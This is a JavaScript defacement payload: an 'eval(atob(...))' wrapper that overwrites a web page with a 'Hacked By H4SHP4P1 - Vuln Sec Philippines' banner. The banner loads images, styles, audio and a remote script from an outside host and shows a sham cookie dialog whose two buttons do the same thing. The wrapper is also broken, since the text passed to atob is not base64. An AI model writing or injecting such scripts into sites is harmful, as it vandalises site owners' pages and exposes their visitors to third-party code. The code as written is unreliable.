eval(atob('document.open();document.write("<!DOCTYPE html><html><head>  <title>Hacked By H4SHP4P1 - Vuln Sec Philippines</title>  <meta charset=\"UTF-8\"/>  <meta name=\"author\" content=\"H4SHP4P1\"/>  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"/>  <meta name=\"description\" content=\"Site was open to attack. No damage done. Fix your security before someone worse comes along.\"/>  <meta property=\"og:title\" content=\"Hacked By - Vuln Sec Philippines\"/>  <meta name=\"keywords\" content=\"H4SHP4P1 - Vuln Sec Philippines, Hacked By H4SHP4P1, haxor uploader, haxor script deface generator, nathan prinsley, mr.prins, prinsh, hacked by, haxor my id\"/>  <meta property=\"og:image\" content=\"https://cdn.prinsh.com/data-1/images/NathanPrinsley-boy-sad.gif\"/>  <meta property=\"og:type\" content=\"website\"/>  <meta property=\"og:site_name\" content=\"Haxor Uploader\"/>  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"https://cdn.prinsh.com/data-1/images/NathanPrinsley-boy-sad.gif\"/>  <link rel=\"stylesheet\" type=\"text/css\" href=\"https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css\"/>  <style>    body {      background: url(\"https://cdn.prinsh.com/data-1/images/NathanPrinsley-star.gif\") no-repeat center center fixed;      background-size: 100% 100%;      font-family: Times New Roman;      margin-top: 35px;    }    h1, h2 { margin: .3em 0; }    h1.nprinsleyy { color: #dbd9d9; }    h2 { color: #dbd9d9; }    p.message_prinsley {      color: #dbd9d9;      margin: .25em 0;      font-size: 16px;    }    .hubungi_prinsh { color: #00eb00; text-decoration: none; }    .hubungi_prinsh:hover { color: red; }    .othermes_nprinsh { color: #dbd9d9; font-size: 16px; }    marquee.foonathanPrinsley {      position: fixed;      width: 100%;      bottom: 0;      font-family: Tahoma;      height: 20px;      color: white;      left: 0;      border-top: 2px solid darkred;      padding: 5px;      background: #000;      transition: filter 220ms ease;    }    .cookie-overlay {      position: fixed;      inset: 0;      background: rgba(0,0,0,0.45);      display: flex;      align-items: center;      justify-content: center;      z-index: 9999;    }    .cookie-box {      max-width: 480px;      background: rgba(12,12,12,0.96);      color: #eee;      padding: 20px;      border-radius: 10px;      box-shadow: 0 8px 40px rgba(0,0,0,0.7);      text-align: left;      font-family: Arial, Helvetica, sans-serif;    }    .cookie-box h3 { margin: 0 0 8px; font-size: 18px; color: #fff; }    .cookie-box p { margin: 0 0 12px; color: #d6d6d6; font-size: 14px; line-height:1.3; }    .cookie-actions { display:flex; gap: 8px; justify-content: flex-end; margin-top: 12px; }    .btn {      padding: 8px 12px;      border-radius: 6px;      border: none;      cursor: pointer;      font-weight: 600;    }    .btn-accept { background: #1e8b3a; color: white; }    .btn-reject { background: #333; color: white; border: 1px solid #555; }    .btn-play {      display: none;      position: fixed;      right: 18px;      bottom: 70px;      z-index: 10000;      padding: 10px 14px;      border-radius: 30px;      border: none;      font-weight: 700;      cursor: pointer;      background: #ffcc00;    }    #main {      transition: filter 220ms ease, transform 220ms ease;    }    #main.blurred,    marquee.foonathanPrinsley.blurred {      filter: blur(6px) saturate(0.9);      pointer-events: none;      user-select: none;    }    @media (max-width:480px) {      .cookie-box { margin: 12px; max-width: calc(100% - 24px); }    }  </style></head><body>  <div id=\"main\" class=\"blurred\">    <center>      <img src=\"https://cdn.prinsh.com/data-1/images/NathanPrinsley-boy-sad.gif\" style=\"width: 20%\">      <h1 class=\"nprinsleyy nprinsley-text-rainbowan\" style=\"font-size:32px;\">Hacked By H4SHP4P1</h1>      <h2 style=\"font-size:24px;\" class=\"nprinsley-detaxt\">Vuln Sec Philippines</h2>      <p class=\"message_prinsley nprinsley-text-glitchan\">        Security compromised. Patch your website before someone with bad intent takes over.      </p>      <hr/>      <p style=\"font-size:20px;\" class=\"nprinsley-text nprinsley-blure\">        <a class=\"hubungi_prinsh\" href=\"https://www.facebook.com/vulnsec.legion\">[My Facebook Page]</a>      </p>      <p class=\"othermes_nprinsh nathan-prinsley_none\"></p>      <audio id=\"bg\" loop muted>        <source src=\"https://nathanprinsley-files.prinsh.com/data-1/mp3/fearless_tule.mp3\" type=\"audio/mpeg\">      </audio>    </center>  </div>  <marquee class=\"foonathanPrinsley blurred\">    <b style=\"color: #dbd9d9;font-size:16px;\" class=\"nprinsley-text-redan\">This is just a warning. Fix your website before someone comes in with bad intentions.</b>  </marquee>  <script src=\"https://cdn.prinsh.com/NathanPrinsley-effect/efek-salju.js\" type=\"text/javascript\"></script>  <div id=\"popup\" class=\"cookie-overlay\" role=\"dialog\" aria-modal=\"true\" aria-labelledby=\"cookieTitle\" aria-describedby=\"cookieDesc\">    <div class=\"cookie-box\">      <h3 id=\"cookieTitle\">We use cookies to improve your experience</h3>      <p id=\"cookieDesc\">Accept to let us remember your prefs for this visit. You can also reject. both choices only last until you leave.</p>      <div class=\"cookie-actions\">        <button id=\"btnNo\" class=\"btn btn-reject\" type=\"button\">Reject</button>        <button id=\"btnOk\" class=\"btn btn-accept\" type=\"button\">Accept</button>      </div>    </div>  </div>  <button id=\"btnPlay\" class=\"btn-play\" aria-hidden=\"true\">▶ Play music</button>  <script>    (function () {      const audio = document.getElementById('bg');      const popup = document.getElementById('popup');      const main = document.getElementById('main');      const footer = document.querySelector('.foonathanPrinsley');      const btnOk = document.getElementById('btnOk');      const btnNo = document.getElementById('btnNo');      const btnPlay = document.getElementById('btnPlay');      function playMusic() {        audio.muted = false;        const p = audio.play();        if (p && typeof p.then === 'function') {          p.then(hideBtn).catch(showBtn);        } else {          hideBtn();        }      }      function closePopup() {        popup.style.display = 'none';        main.classList.remove('blurred');        footer.classList.remove('blurred');      }      function showBtn() {        btnPlay.style.display = 'inline-block';        btnPlay.setAttribute('aria-hidden','false');      }      function hideBtn() {        btnPlay.style.display = 'none';        btnPlay.setAttribute('aria-hidden','true');      }      btnOk.addEventListener('click', () => { closePopup(); playMusic(); }, { once: true });      btnNo.addEventListener('click', () => { closePopup(); playMusic(); }, { once: true });      btnPlay.addEventListener('click', () => {        audio.muted = false;        audio.play().then(hideBtn).catch(()=>{});      });      document.addEventListener('click', function firstClick() {        const isHidden = window.getComputedStyle(popup).display === 'none';        if (isHidden) {          playMusic();          document.removeEventListener('click', firstClick);        }      }, { once: true });    })();  </script></body></html>");document.close();'));
